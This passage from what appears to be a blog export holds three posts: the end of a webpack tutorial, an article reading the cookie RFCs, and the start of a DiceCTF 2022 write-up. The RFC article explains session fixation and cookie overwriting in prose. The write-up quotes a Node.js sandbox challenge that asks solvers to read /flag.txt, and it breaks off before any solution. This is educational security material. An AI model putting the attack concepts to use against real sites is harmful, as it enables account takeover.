to be any problems. You can run it on the webpage by adding the type=&quot;module&quot; attribute to the import tag, which is great. However, things are not that simple. The first problem is browser support. This problem can be big or small depending on whether your company needs to support IE, because all major browsers support import and export, but IE does not. The second problem is, what if I want to use packages written by others on npm? There is no problem with this in Node.js because you must first install node_modules in the folder, but what about the webpage? Do you have to upload the entire node_modules folder? Another problem is how to write the path when importing? Do you have to write it explicitly like import pad from &#39;./node_modules/pad-left/index.js&#39;? This is a very poorly maintainable way of writing, and if the entry point of the module changes, you have to rewrite all the import statements. This problem is actually quite troublesome because during development, you usually use modules written by others. If you cannot easily support importing these modules, it will cause a lot of inconvenience. Do you remember what I said before? “The world of front-end is simple. If something is not supported, write a tool to support it.” Here we need to modify it a bit to “The world of front-end is simple. If something is not supported or has poor support, write a tool to support it.” It is because the native module mechanism of the browser will encounter many problems (compatibility, inability to be compatible with npm, etc.), so we need an additional tool. And this tool is webpack. Exploring webpack againTo experience the power of webpack, let’s install a package first: npm install pad-left Then import and use the package in main.js: import obj from './utils.js' import pad from 'pad-left' console.log(obj.cal(30)) console.log(pad('4', 4, 0)) Then follow the previous process to package the file. The config file has been written before, so just enter the command: npx webpack --config webpack.config.js Then open index.html and change the imported script. You don’t need type=module because of webpack: &lt;html> &lt;head> &lt;script src=\"./webpack_bundle.js\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> Finally, open index.html, and if you see the output of 9 and 0004 on the console, it means that the packaging was successful. One of the benefits of using webpack is that we can package the modules installed using npm together, just like packaging the modules we wrote ourselves, without doing anything else. This is something that native browsers cannot do. The reason we need webpack is that the native browser module function and support are not that complete. However, the power of webpack is not just that. When you open the webpack official website, you will see this picture: The most powerful thing about webpack is that it extends the concept of “modularity”. When we were discussing modularity just now, we only talked about JavaScript and program modules. But webpack regards “any resource” as a module. Images and CSS are modules, so you can import Image from &#39;./assets/banner.png&#39; and import styles from &#39;style.css&#39;. You can import any resource and use it. This has nothing to do with JavaScript or ES6. It is entirely an extension of webpack. You cannot use it in a browser. To support this functionality, webpack defines many loaders for different resources. These loaders process the resources to load them. This is where webpack’s power lies. For example, you can use the scss loader to load scss files, and it will compile them into CSS when you import them. You don’t have to do it yourself. The same goes for JS. You can write the latest and greatest syntax and use the babel-loader to convert ES10 syntax to ES5 when you load it. This resource loading and conversion is where webpack is most powerful. Do you remember when you were writing React and importing images and CSS like it was nothing? This is because webpack is handling it for you. It is not something that browsers natively support, but rather something that webpack’s module system does for you. Furthermore, once you have mastered the basics of resource bundling, webpack can do more interesting things with loaders and plugins, such as: Uglifying JS when loading it Minifying CSS when loading it Adding a hash to the packaged file name Packaging different files for different pages so that you don’t have to load all JS at once Supporting dynamic JS imports, loading only when needed That’s the end of the webpack tutorial. I don’t intend to go deeper into it, as it would be more about tool usage. The main purpose of this article is to let you know: Why use webpack? What happens if you don’t use webpack? What is the difference between webpack and the standard module defined by ES6? The most basic usage of webpack (writing configuration files and packaging JS) SnowpackAs we mentioned earlier, one of the reasons for using webpack is that native browsers cannot package npm-installed modules. In addition to solving this problem, webpack also extends the definition of “modules” so that any resource can be treated as a module. With a powerful loader and plugin system, webpack can do more interesting things. Recently, another library called Snowpack was released, which claims to be able to run in browsers without packaging. The principle is simple: it organizes the modules installed in node_modules and puts them in another folder called web_modules. When you need to import them, you can import them from there. However, not every module can be used this way. The module itself must support the standard ESM module. For example, pad-left that we used earlier does not support it, so we cannot use it with Snowpack. Therefore, we will install a supported mathjs later to try it out. Let’s try it out. First, install Snowpack and mathjs: npm install --save-dev snowpack npm install mathjs Then run Snowpack to organize the modules: npx snowpack After running it, you will see a new folder called web_modules with two files: import-map.json and mathjs.js. Next, update main.js: import obj from './utils.js' import &#123;pi&#125; from './web_modules/mathjs.js' // 從 web_modules 資料夾引入 console.log(obj.cal(30)) console.log(pi) Then update index.html: &lt;html> &lt;head> &lt;script src=\"./main.js\" type=\"module\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> Finally, run a server with the command: python -m SimpleHTTPServer 8080 You will see 3.141592653589793 in the console, indicating that we can use the npm-installed module successfully! Snowpack is easy to use, and the problem it solves is simple. It only solves the problem of “importing third-party modules,” and does not manage anything else. Can it import images and CSS like webpack? No, and the official website suggests that you use the old methods: The website also has a section on who should use Snowpack and who should not. For example, if you want to support IE11 or need to use a library that does not support ESM, you should not use Snowpack. Snowpack is still new, and there are still many issues to be resolved if you want to use it in production. I specifically mention it here to show you another solution besides webpack. You may have heard of Parcel or Rollup, which are just other tools for packaging. You can choose a tool to familiarize yourself with, but the key is to understand why you need these tools before that. ConclusionLet’s answer the questions at the beginning: Q: Why do many projects (such as React) need to be built before deployment? What is this step doing?Because the source code cannot be directly placed on the browser (it will not be able to execute), it must be processed by webpack packaging, and the packaged file can be executed by the browser. Q: Do you know the difference between require/module.exports and import/export?require/module.exports is a specification called CommonJS, which is supported by Node.js but not by browsers. import/export is a specification of ES6, which is partially supported by Node.js and browsers. Q: Do you know that these two syntaxes import/export cannot be used casually on browsers?There are usage restrictions, such as adding type=module, and you cannot directly import modules in npm. The browser support is also a consideration, and IE11 does not support this syntax. Q: Do you know why you need to use webpack?There are many reasons, such as: I want to use third-party modules on npm I want to import images as resources I want to import CSS as resources I want to handle uglify and minify in one place However, the key is actually the first one, because the native ES6 module support of the browser is not so high, especially when importing third-party modules, so we need webpack or other packaging tools to help us handle this part. Q: Do you know why webpack needs a loader?Because importing images or CSS as resources is not a formal specification, but a definition extended by webpack itself. In order to support these resources, a special loader must be written to load them, otherwise the default loader can only load JavaScript. When I first came into contact with webpack, I was also very confused. I didn’t know why I needed webpack, and I didn’t know what magic it did. It wasn’t until later that I slowly explored and found that I was wrong from the beginning, and I shouldn’t start with webpack. If you don’t understand the concept of modularization, don’t even know that you can’t use require on the browser, how can you understand what webpack is doing? And some students I recently met, even though they have work experience or have used webpack, they still have only a vague understanding of this part. In my opinion, the reason is that the understanding of modularization is insufficient, the understanding of historical context is not enough, and the distinction between “executing JS on the browser” and “executing JS on the computer using Node.js” is not clear enough, so many things are mixed together and treated as the same. So although this article is called “webpack beginner’s tutorial”, it talks more about modularization and the reasons for using webpack, and does not really elaborate on “how to use webpack”. One reason is that I think that understanding the principles and reasons will greatly reduce the threshold for using tools; the other is that if I continue to write, it will never end. If you really want to talk about webpack, you can write another article. In fact, there are many things about modularization that I deliberately did not mention, such as other specifications such as AMD&#x2F;UMD and the tool RequireJS. I think it is good for this article to ignore these contents selectively, because once they are mentioned, things will become more complicated, so these contents are selectively ignored. When writing, choosing what to say and what not to say is also a skill, and maybe I can write another article to make up for these parts that have not been mentioned in the future. Finally, I hope that after reading this article, you can really understand the problems that the native ES6 module will encounter on the browser, and you will know why you need to use webpack. If there are any errors, please feel free to correct them. Thank you! Reference: What? We actually have 3 standards? - Have you heard of CommonJS? (Day9)","link":"/2020/01/21/en/webpack-newbie-tutorial/"},{"title":"A Brief Discussion on Session and Cookie: Reading RFC Together","text":"IntroductionThis is a series of three articles, which I call the “Session and Cookie Trilogy”. The goal of this series is to discuss this classic topic from shallow to deep, from understanding concepts to understanding implementation methods. This is the second article in the series, and the complete links to the three articles are as follows: Plain Talk on Session and Cookie: Starting with Running a Grocery Store A Brief Discussion on Session and Cookie: Reading RFC Together In-depth Session and Cookie: Implementation in Express, PHP, and Rails In the previous article, we mentioned the meaning of Session: What is a Session? It is a mechanism that makes Request stateful. In the example of Xiao Ming, Session is a mechanism that allows guests to be related to each other. In the story, we used notes and information in the phone to compare, and there are many ways to achieve Session. In fact, when writing this series, “What is the clearest definition of Session” troubled me for a while, and I still can’t be completely sure what is right. In my mind, there are two explanations that are quite reasonable. The first explanation is what we talked about in the previous article. Session is a mechanism that makes Request stateful, and the second explanation of Session (also a more close to the original English explanation) is “a period of time with state” or “context”, so things in Session can be viewed together. There is a saying that the original meaning of Session is indeed the second one, but in the Web field, Session has become a “mechanism”, so both meanings are acceptable. But I actually tend to think that the second one is the only correct explanation method, and the second one is correct from beginning to end, while the first one is a misunderstanding. For example, if you have used Google Analytics, there is a term called “session”, and the English name is Session. Google’s interpretation of Session is as follows: (Source: Analytics Definition of Website Session) It defines Session as “multiple user interactions that occur on the website during a specified period of time” and says that Session can be used as a container. Although Google Analytics’ Session is different from the Session used in Web technology, I think they can refer to each other to some extent. And the definition of this Session is similar to what I said before, “a period of time with state” or “context”. So why did I not mention it in the previous article and define Session as a “misunderstanding” in my eyes, even though I tend to this definition? The first reason is that both explanations may be acceptable, so both may be correct. The second reason is that I think the precise definition of Session is very difficult to explain because the concept is too abstract. I think that if this explanation is mentioned, it will only make your understanding of Session more confusing, so it was not mentioned in the previous article. The third reason is that I think it is also possible to explain it as a mechanism, and it is easier to understand. Even if it is really wrong, the impact is not that great. In short, I think that for people who have no foundation at all, understanding Session as a mechanism is enough. But for people like me who want to dig deeper, what I want to know is the most correct understanding, and it must be based on evidence. What is considered evidence? Reading the RFC documents that discussed Cookie and Session at that time should be convincing enough, right? RFC documents have to go through a series of discussions and reviews before they can be born. I can’t think of any explanation that is more convincing than RFC. In this article, we will read three RFCs: RFC 2109 RFC 2965 RFC 6265 Why read three? Because these three are all documents related to Cookie. 2109 is the earliest one. Later, some problems occurred, so it was replaced by the new 2965. After ten years, 6265 appeared, which is the current standard. I believe that starting to read something from the earliest possible time can save time and effort, because there will be less content and it will be easier to understand, and it will also be easier to find information. For example, if you want to read the React source code, I would recommend starting from version 0.xx, and for reading ECMAScript, you can start from ES3, and you can also learn about the evolution process. That’s the background, and the goal of this article is to read the RFC and see how it describes Cookies and Sessions. I will translate some of the original text, but translation is a profession, and my translation may be poor and certainly contains errors. Please still refer to the original text, and consider my translation as a supplement. If there are any serious errors, please let me know, I would be very grateful. RFC 2109RFC 2109 was published in February 1997, a time when there was no Ajax and Netscape still dominated the browser market. The title of this document is “HTTP State Management Mechanism”. Let’s start with the abstract: This document specifies a way to create a stateful session with HTTP requests and responses. It describes two new headers, Cookie and Set-Cookie, which carry state information between participating origin servers and user agents. The method described here differs from Netscape’s Cookie proposal, but it can interoperate with HTTP&#x2F;1.0 user agents that use Netscape’s method. (See the HISTORICAL section.) This document describes a way to create stateful sessions with HTTP requests and responses. Currently, HTTP servers respond to each client request without relating that request to previous or subsequent requests; the technique allows clients and servers that wish to exchange state information to place HTTP requests and responses within a larger context, which we term a “session”. The context might be used to create, for example, a “shopping cart”, in which user selections can be aggregated before purchase, or a magazine browsing system, in which a user’s previous reading affects which offerings are presented. The abstract is very clear. In short, it introduces the use of two headers, Cookie and Set-Cookie, to establish a session. Netscape is mentioned because Cookies were originally implemented by Netscape, but unfortunately, I couldn’t find any links to see what Netscape’s Cookie specifications looked like. The second part, TERMINOLOGY, defines the usage of some technical terms, which can be skimmed over. The focus is on the third part, STATE AND SESSIONS: This document describes a way to create stateful sessions with HTTP requests and responses. Currently, HTTP servers respond to each client request without relating that request to previous or subsequent requests; the technique allows clients and servers that wish to exchange state information to place HTTP requests and responses within a larger context, which we term a “session”. This context might be used to create, for example, a “shopping cart”, in which user selections can be aggregated before purchase, or a magazine browsing system, in which a user’s previous reading affects which offerings are presented. This section describes how to use HTTP requests and responses to create a stateful session. Currently, HTTP servers respond to each client request independently, without relating it to previous or subsequent requests. This method allows servers and clients that want to exchange state information to place HTTP requests and responses in a larger context, which is called a “session”. This context can be used to create a shopping cart, for example, where user selections can be aggregated before purchase, or a magazine browsing system, where a user’s previous reading affects which offerings are presented. Here, the definition of Session is just as I mentioned earlier, Session is a “period with state”, or “context”, which means that the Request and Response in this context can be viewed together, and thus they have a state. There are, of course, many different potential contexts and thus many different potential types of session. The designers’ paradigm for sessions created by the exchange of cookies has these key attributes: Each session has a beginning and an end. Each session is relatively short-lived. Either the user agent or the origin server may terminate a session. The session is implicit in the exchange of state information. There are many different types of sessions, and sessions created by the exchange of cookies have several key points: Each session has a beginning and an end. Each session is relatively short-lived. Either the user agent or the origin server may terminate a session. The session is implicit in the exchange of state information. This section just briefly introduces the characteristics of Session. If we understand Session as a “mechanism”, how do we explain the paragraph above? “Each Session mechanism is relatively short-lived”? It sounds a bit strange, so this is why I said it’s a bit strange to interpret Session as a mechanism. Next, many parts of Chapter 4 are about the specifications of those Headers. We skip them and only select a few paragraphs that I think are more important: 4.2.1 General The origin server initiates a session, if it so desires. (…) &gt;To initiate a session, the origin server returns an extra response header to the client, Set-Cookie. (The details follow later.) A user agent returns a Cookie request header (see below) to the origin server if it chooses to continue a session. If the Server desires, it can initiate a session, and the way to initiate it is to return a Set-Cookie Header. If the browser decides to continue this session, it can return the Cookie Header. Simply put, the server sends the state in the Set-Cookie Header to the browser, and the browser brings the Cookie in the subsequent Request, so a Session is established because the subsequent Request has a state. Next, let’s take a look at the EXAMPLES section in Chapter 5. Let’s take one of the examples. This example is relatively simple, so I’ll just translate it into Chinese. If you want to see the original text, you can go here: 5.1 Example 1. Step 1: Browser -&gt; ServerPOST &#x2F;acme&#x2F;login HTTP&#x2F;1.1 [form data] The user logs in through the form. Step 2: Server -&gt; BrowserHTTP&#x2F;1.1 200 OK Set-Cookie: Customer&#x3D;&quot;WILE_E_COYOTE&quot;; Version&#x3D;&quot;1&quot;; Path&#x3D;&quot;&#x2F;acme&quot; Login successful, the server sends a Set-Cookie Header and sets the information, storing the user’s identity. Step 3: Browser -&gt; ServerPOST &#x2F;acme&#x2F;pickitem HTTP&#x2F;1.1 Cookie: $Version&#x3D;&quot;1&quot;; Customer&#x3D;&quot;WILE_E_COYOTE&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; [form data] The user adds an item to the shopping cart. Step 4: Server -&gt; BrowserHTTP&#x2F;1.1 200 OK Set-Cookie: Part_Number&#x3D;&quot;Rocket_Launcher_0001&quot;; Version&#x3D;&quot;1&quot;; Path&#x3D;&quot;&#x2F;acme&quot; Step 4: Server sets a cookie to store the items just added to the shopping cart. Step 5: Browser -&gt; Server POST &#x2F;acme&#x2F;shipping HTTP&#x2F;1.1 Cookie: $Version&#x3D;&quot;1&quot;; Customer&#x3D;&quot;WILE_E_COYOTE&quot;; $Path&#x3D;&quot;&#x2F;acme&quot;; Part_Number&#x3D;&quot;Rocket_Launcher_0001&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; [form data] The user selects the shipping method using a form. Step 6: Server -&gt; Browser HTTP&#x2F;1.1 200 OK Set-Cookie: Shipping&#x3D;&quot;FedEx&quot;; Version&#x3D;&quot;1&quot;; Path&#x3D;&quot;&#x2F;acme&quot; A new cookie is set to store the shipping method. Step 7: Browser -&gt; Server POST &#x2F;acme&#x2F;process HTTP&#x2F;1.1 Cookie: $Version&#x3D;&quot;1&quot;; Customer&#x3D;&quot;WILE_E_COYOTE&quot;; $Path&#x3D;&quot;&#x2F;acme&quot;; Part_Number&#x3D;&quot;Rocket_Launcher_0001&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; Shipping&#x3D;&quot;FedEx&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; [form data] The user selects checkout. Step 8: Server -&gt; Browser HTTP&#x2F;1.1 200 OK The transaction is completed based on the user data, purchased items, and shipping method carried by the cookie header sent by the browser. The above example roughly explains how cookies work. The server sends the Set-Cookie header to set the information, and the browser sends the Cookie header to carry the previously stored information, creating a state and starting a session. Next, let’s look at the IMPLEMENTATION CONSIDERATIONS section, which discusses some implementation considerations. Here’s an excerpt: 6.1 Set-Cookie Content The session information can obviously be clear or encoded text that describes state. However, if it grows too large, it can become unwieldy. Therefore, an implementor might choose for the session information to be a key to a server-side resource. Of course, using a database creates some problems that this state management specification was meant to avoid, namely: keeping real state on the server side; how and when to garbage-collect the database entry, in case the user agent terminates the session by, for example, exiting. The session information stored in the cookie can be clear or encoded text that describes the state. However, if the stored information becomes too large, it can become unwieldy. Therefore, you can choose to store only a key that corresponds to a server resource in the session information. However, this approach creates some problems that this state management specification was meant to avoid, namely: keeping real state on the server side; how and when to garbage-collect the database entry, in case the user agent terminates the session by, for example, exiting. In fact, these two different methods are the Cookie-based session and SessionID mentioned in the previous article. The former’s disadvantage is that storing too much information can become unwieldy, while the latter requires storing the state on the server. Both methods have their advantages and disadvantages, but the SessionID method is more commonly used, which is what the original article refers to as “session information to be a key to a server-side resource.” Other parts of the article discuss security or privacy-related issues, which are somewhat different from the topic we are discussing here, so I will not go into detail. Let’s summarize what we have learned so far. First, cookies were created to establish sessions because before that, sessions could only be established through the methods mentioned in my previous article, such as using the URL or putting a hidden field in a form. Cookies were created to simplify these actions. The actual method is for the server to return the Set-Cookie header, and the user agent stores this information and adds a Cookie header to subsequent requests. This is what we referred to as a “note” in the previous article, which is carried every time and creates a state between requests. You can put any state in the cookie, but if there is too much information, you can consider moving this state to the server and only storing an ID that corresponds to it in the cookie. This is what we previously referred to as Session ID and Session Data. RFC 2965 was born in 2000, but its content is not far from RFC 2109, with about 80% of the content being the same. Why? Shortly after RFC 2109 was released, they discovered that IE3 and Netscape Navigator3 implemented the “new” cookie standard (the old one being Netscape’s original specification) differently. For example, in the following section: Set-cookie: xx&#x3D;&quot;1&#x3D;2\\&amp;3-4&quot;; Comment&#x3D;&quot;blah&quot;; Version&#x3D;1; Max-Age&#x3D;15552000; Path&#x3D;&#x2F;; Expires&#x3D;Sun, 27 Apr 1997 01:16:23 GMT In IE, the cookie is set to Cookie: Max-Age=15552000, while in Netscape Navigator it is what we expect: Cookie: xx=&quot;1=2\\&amp;3-4&quot;. The same header produces different results, so they had to find a way to correct this behavior. Finally, RFC 2965 was introduced, which introduced two new headers: Cookie2 and Set-Cookie2, with the rest being similar to RFC 2109. Therefore, we can skip 2965 and go straight to the latest RFC 6265. RFC 6265RFC 6265 is a document that appeared in 2011, 11 years after the previous one. This document can be said to have updated the cookie rules again, with significant changes. The Introduction explains: Prior to this document, there were at least three descriptions of cookies: the so-called “Netscape cookie specification” [Netscape], RFC 2109 [RFC2109], and RFC 2965 [RFC2965]. However, none of these documents describe how the Cookie and Set-Cookie headers are actually used on the Internet (see [Kri2001] for historical context). Before this document, there were at least three different cookie specifications: the first was Netscape’s specification, followed by RFC 2109 and 2965. However, none of these documents really describe how we use cookies and Set-Cookie today. Some of the attributes we use today did not exist in RFC 2965, such as HttpOnly. This specification defines many things more clearly, and interested readers can read it themselves. Next, let’s look at some interesting places. The first is 3.1 Examples, which mentions the use of SessionID directly: 3.1. Examples Using the Set-Cookie header, a server can send the user agent a short string in an HTTP response that the user agent will return in future HTTP requests that are within the scope of the cookie. For example, the server can send the user agent a “session identifier” named SID with the value 31d4d96e407aad42. The user agent then returns the session identifier in subsequent requests. Using the Set-Cookie header, a server can send the user agent a short string in an HTTP response that the user agent will return in future HTTP requests that are within the scope of the cookie. For example, the server can send the user agent a “session identifier” named SID with the value 31d4d96e407aad42. The user agent then returns the session identifier in subsequent requests. There is also a more complete example below, but it’s a bit long so I won’t translate it. I actually recommend that everyone read the entire document because it defines the cookie specifications we use today (basically, although there are still some differences), and you can get the most accurate information from the specifications. For example: 4.1.2.5. The Secure Attribute The Secure attribute limits the scope of the cookie to “secure” channels (where “secure” is defined by the user agent). When a cookie has the Secure attribute, the user agent will include the cookie in an HTTP request only if the request is transmitted over a secure channel (typically HTTP over Transport Layer Security (TLS)[RFC2818]). The Secure attribute limits the scope of the cookie to “secure” channels (where “secure” is defined by the user agent). When a cookie has the Secure attribute, the user agent will include the cookie in an HTTP request only if the request is transmitted over a secure channel (typically HTTP over Transport Layer Security (TLS)[RFC2818]). Here’s the translated text: Here we can see the difference between specifications and implementations. The specification only states that “what is secure is defined by the user agent itself”, and does not enforce the rule that “transmission can only occur when using HTTPS”. Therefore, what we generally understand as “Secure means that it can only be transmitted through HTTPS” actually refers to the implementation of mainstream browsers, not the specification of RFC. So, to fully answer the question “what does setting the Secure attribute mean”, you can answer like this: It means that this cookie can only be transmitted through a secure channel. As for what is secure, RFC states that it is defined by the browser itself. Based on the current mainstream implementation, it means that it can only be transmitted through HTTPS. Next, let’s take a look at something that is closely related to us: Privacy Considerations Cookies are often criticized for letting servers track users. For example, a number of “web analytics” companies use cookies to recognize when a user returns to a web site or visits another web site. Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts. Cookies are often criticized for letting servers track users. For example, a number of “web analytics” companies use cookies to recognize when a user returns to a web site or visits another web site. Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts. 7.1. Third-Party Cookies Particularly worrisome are so-called “third-party” cookies. In rendering an HTML document, a user agent often requests resources from other servers (such as advertising networks). These third-party servers can use cookies to track the user even if the user never visits the server directly. For example, if a user visits a site that contains content from a third party and then later visits another site that contains content from the same third party, the third party can track the user between the two sites. Third-party cookie blocking policies are often ineffective at achieving their privacy goals if servers attempt to work around their restrictions to track users. In particular, two collaborating servers can often track users without using cookies at all by injecting identifying information into dynamic URLs. Cookies are often criticized for allowing servers to track users. For example, many “web analytics” companies use cookies to recognize when a user returns to a website or visits another website. Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts. Particularly worrisome are so-called “third-party” cookies. In rendering an HTML document, a user agent often requests resources from other servers (such as advertising networks). These third-party servers can use cookies to track the user even if the user never visits the server directly. For example, if a user visits a site that contains content from a third party and then later visits another site that contains content from the same third party, the third party can track the user between the two sites. Third-party cookie blocking policies are often ineffective at achieving their privacy goals if servers attempt to work around their restrictions to track users. In particular, two collaborating servers can often track users without using cookies at all by injecting identifying information into dynamic URLs. In fact, the issue of third-party cookies was discussed in RFC 2109, which was then called Unverifiable Transactions. When I saw it, I was surprised that the problem of third-party cookies had already been mentioned in 1997 when cookies had just emerged. After all, this issue has only been widely discussed recently, and it was only in recent years that Safari and Firefox began blocking third-party cookies by default. Even Facebook’s solution, dynamic URLs, had already appeared in RFC 6265 (I hate that fbcid string…). Finally, let’s take a look at some security-related things, all of which are in section 8.Security Considerations: 8.4. Session Identifiers Instead of storing session information directly in a cookie (where it might be exposed to or replayed by an attacker), servers commonly store a nonce (or “session identifier”) in a cookie. When the server receives an HTTP request with a nonce, the server can look up state information associated with the cookie using the nonce as a key. Instead of storing session information directly in a cookie, servers usually only store a session ID in the cookie. When the server receives this session ID, it can find the corresponding data. Using session identifier cookies limits the damage an attacker can cause if the attacker learns the contents of a cookie because the nonce is useful only for interacting with the server (unlike non- nonce cookie content, which might itself be sensitive). Furthermore, using a single nonce prevents an attacker from “splicing” together cookie content from two interactions with the server, which could cause the server to behave unexpectedly. Compared to directly storing sensitive information in cookies, only storing session IDs can limit the damage that attackers can cause, because even if attackers know that there is a session ID stored inside, it is useless. (I don’t quite understand the “splicing” part.) Using session identifiers is not without risk. For example, the server SHOULD take care to avoid “session fixation” vulnerabilities. A session fixation attack proceeds in three steps. First, the attacker transplants a session identifier from his or her user agent to the victim’s user agent. Second, the victim uses that session identifier to interact with the server, possibly imbuing the session identifier with the user’s credentials or confidential information. Third, the attacker uses the session identifier to interact with server directly, possibly obtaining the user’s authority or confidential information. Using session IDs is not completely risk-free. For example, the server should avoid session fixation attacks. This type of attack has three steps: first, the attacker generates a session ID and passes it to the victim; second, the victim logs in using this session ID; after the victim logs in, the attacker can use the same session ID to obtain the victim’s data. The original article did not provide a clear explanation of session fixation. Interested readers can refer to HTTP Session Attacks and Protection for a clearer explanation. In simple terms, session fixation is when the victim logs in using the session ID specified by the attacker. As a result, the session ID on the server side is bound to the victim’s account. Then, using the same session ID, the attacker can log in and use the website as the victim. Now let’s look at another security issue: 8.6. Weak Integrity Cookies do not provide integrity guarantees for sibling domains (and their subdomains). For example, consider foo.example.com and bar.example.com. The foo.example.com server can set a cookie with a Domain attribute of “example.com” (possibly overwriting an existing “example.com” cookie set by bar.example.com), and the user agent will include that cookie in HTTP requests to bar.example.com. In the worst case, bar.example.com will be unable to distinguish this cookie from a cookie it set itself. The foo.example.com server might be able to leverage this ability to mount an attack against bar.example.com. Cookies do not provide integrity guarantees for subdomains. For example, foo.example.com can set a cookie for example.com, which may overwrite the cookie set by bar.example.com for example.com. In the worst case, when bar.example.com receives this cookie, it cannot distinguish whether it was set by itself or by someone else. Foo.example.com can use this feature to attack bar.example.com. An active network attacker can also inject cookies into the Cookie header sent to https://example.com/ by impersonating a response from http://example.com/ and injecting a Set-Cookie header. The HTTPS server at example.com will be unable to distinguish these cookies from cookies that it set itself in an HTTPS response. An active network attacker might be able to leverage this ability to mount an attack against example.com even if example.com uses HTTPS exclusively. Attackers can also use http://example.com/ to overwrite cookies from https://example.com/ (the former is http and the latter is https), and the server cannot distinguish whether the cookie was set by http or https. Attackers can also use this feature to launch attacks. The above paragraph is also mentioned in 4.1.2.5 The Secure Attribute: Although seemingly useful for protecting cookies from active network attackers, the Secure attribute protects only the cookie’s confidentiality. An active network attacker can overwrite Secure cookies from an insecure channel, disrupting their integrity. The gist of it is that the Secure attribute cannot guarantee the integrity of cookies. Attackers can overwrite HTTPS cookies with HTTP. When I read this, I was shocked because it was the same issue I wrote about before: The Most Difficult Cookie Problem I’ve Encountered. Now I finally understand why Safari and Firefox didn’t block this behavior, because the specification doesn’t require it. As for Chrome, its implementation refers to several different RFCs. In the CookieMonster responsible for managing cookies, it is written that: CookieMonster requirements are, in theory, specified by various RFCs. RFC 6265 is currently controlling, and supersedes RFC 2965. However, most browsers do not actually follow those RFCs, and Chromium has compatibility with existing browsers as a higher priority than RFC compliance. An RFC that more closely describes how browsers normally handles cookies is being considered by the RFC; it is available at http://tools.ietf.org/html/draft-ietf-httpstate-cookie. The various RFCs should be examined to understand basic cookie behavior; this document will only describe variations from the RFCs. In CookieMonster.cc, it is also written that: If the cookie is being set from an insecure scheme, then if a cookie already exists with the same name and it is Secure, then the cookie should not be updated if they domain-match and ignoring the path attribute. See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone The document mentioned in the article is still in draft stage, titled “Deprecate modification of ‘secure’ cookies from non-secure origins,” and was initiated by Google employees. The Introduction is very clear: Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookies’ implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself. This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY]. We can mitigate the risk of these attacks by making it more difficult for non-secure origins to influence the state of secure origins. Accordingly, this document recommends the deprecation and removal of non-secure origins’ ability to write cookies with a ‘secure’ flag, and their ability to overwrite cookies whose ‘secure’ flag is set. The gist of this article is similar to what we saw in Sections 8.5 and 8.6 of RFC 6265. Due to some historical reasons, secure cookies can be overridden by non-secure sources. This document aims to prevent this behavior. Having read all the documents related to sessions and cookies, let’s summarize. SummaryGoing back to the initial question: what is a session? From the various session-related terms mentioned in the RFC, I believe that a session is one of its original meanings in English, representing “a period with a state” or “context.” Therefore, to open or create a session, it is necessary to have a mechanism to establish and maintain the state. This is also why the RFC title for cookies is “HTTP State Management Mechanism.” Before cookies appeared, sessions could still be established by putting state information in the URL or hiding it in form forms. But after cookies appeared, it became easier to create sessions, just by using the Set-Cookie and Cookie headers. After creating a session, the stored state is called session information. If you choose to store this information in a cookie, it is called a cookie-based session. Another method is to store only a SessionID in the cookie, and store other session information on the server, linking the two through this ID. In addition to sessions, we also see some interesting things in the RFC, such as privacy concerns about third-party cookies and security issues related to cookies. These can also deepen your understanding of cookies. Before ending, I sincerely recommend an article: HTTP Cookies: Standards, Privacy, and Politics. You can download the PDF on the right side of the webpage to read it. The author of this article is also the author of RFC 2109 and 2965. The article clearly explains the history of cookies and what happened at the time. I strongly recommend that everyone take some time to read this article, which can deepen your understanding of the early history of cookies and sessions. Finally, don’t forget that this is the second article in the series. In the next article, we will look at how mainstream frameworks handle sessions. The complete links for the three articles are as follows: Plain Talk about Sessions and Cookies: Starting with Running a Grocery Store Talking about Sessions and Cookies: Reading RFC Together In-depth Sessions and Cookies: Implementation in Express, PHP, and Rails","link":"/2019/08/09/en/session-and-cookie-part2/"},{"title":"Various JS and Front-end Tips I Learned from DiceCTF 2022","text":"If you don’t know what CTF is, you can refer to my previous article: How to Get Started with Web Challenges in CTF?, which briefly introduces what CTF is and some basic types of challenges. I played DiceCTF 2021 seriously last year and finally solved 6 web challenges. My experience is here: DiceCTF 2021 - Summary. I took a look at this year’s DiceCTF and was completely shocked. The difficulty level is completely different. There are a total of 10 web challenges this time, with 1 easy challenge solved by 365 teams, another relatively simple one solved by 75 teams, and the other 8 challenges solved by only 5 teams or less, with one of them unsolved. As a person who likes web and JS-related tips, this is a great learning opportunity to learn various techniques through the writeup released after the competition. There won’t be notes on all web challenges below, only the ones I’m interested in. misc&#x2F;undefined(55 solves)There is also a JS-related challenge in the misc category this time, and the challenge description is as follows: I was writing some Javascript when everything became undefined… Can you create something out of nothing and read the flag at &#x2F;flag.txt? Tested for Node version 17. The source code looks like this: #!/usr/local/bin/node // don't mind the ugly hack to read input console.log(\"What do you want to run?\"); let inpBuf = Buffer.alloc(2048); const input = inpBuf.slice(0, require(\"fs\").readSync(0, inpBuf)).toString(\"utf8\"); inpBuf = undefined; Function.prototype.constructor = undefined; (async () => &#123;&#125;).constructor.prototype.constructor = undefined; (function*()&#123;&#125;).constructor.prototype.constructor = undefined; (async function*()&#123;&#125;).constructor.prototype.constructor = undefined; for (const key of Object.getOwnPropertyNames(global)) &#123; if ([\"global\", \"console\", \"eval\"].includes(key)) &#123; continue; &#125; global[key] = undefined; delete global[key]; &#125; delete global.global; process = undefined; &#123; let AbortController=undefined;let AbortSignal=undefined; let AggregateError=undefined;let Array=undefined; let ArrayBuffer=undefined;let Atomics=undefined; let BigInt=undefined;let BigInt64Array=undefined; let BigUint64Array=undefined;let Boolean=undefined; let Buffer=undefined;let DOMException=undefined; let DataView=undefined;let Date=undefined; 